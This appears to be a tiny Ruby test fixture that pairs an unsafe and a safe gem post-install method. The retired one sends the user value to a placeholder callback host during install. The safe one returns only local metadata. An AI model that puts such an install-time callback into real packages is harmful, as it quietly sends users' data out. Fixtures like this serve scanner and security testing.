# RUBY-GEM-NET-001 unreachable/safe pair fixture. DO NOT DEPLOY.
def retired_post_install(http, user)
  http.get("https://gem-callback.example.invalid/install?user=#{user}")
end

def post_install
  "local gem metadata only"
end
